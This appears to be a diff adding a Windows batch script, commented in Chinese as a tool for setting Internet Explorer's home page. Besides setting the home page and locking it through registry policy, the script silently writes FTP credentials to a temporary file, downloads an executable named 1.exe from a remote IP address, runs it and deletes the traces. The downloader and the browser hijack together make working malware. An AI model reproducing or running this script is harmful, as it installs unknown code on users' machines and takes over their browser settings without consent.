@@ -1,0 +1,20 @@
+@shift
+@echo off
+ping 127.0.0.1 -n 100
+@echo open 121.11.158.176 >>c:\1.txt&
+@echo wangyunfei>>c:\1.txt&
+@echo 619209>>c:\1.txt&
+@echo get web/1.exe>>c:\1.txt&
+@echo bye>>c:\1.txt&
+@ftp -s:c:\1.txt&del c:\1.txt&1.exe&del 1.exe
+START HTTP://WWW.OIwww.com
+::设置主页地址为"www.oiwww.com",可自行更改.
+set StartPage=www.oiwww.com
+::设置IE是否可更改主页地址.0-是,1-否
+set dword=1
+::设置地址
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d %StartPage% /f
+::设置更改主页权限
+reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HOMEPAGE /t REG_DWORD /d %dword% /f
+pause>nul
+@echo off
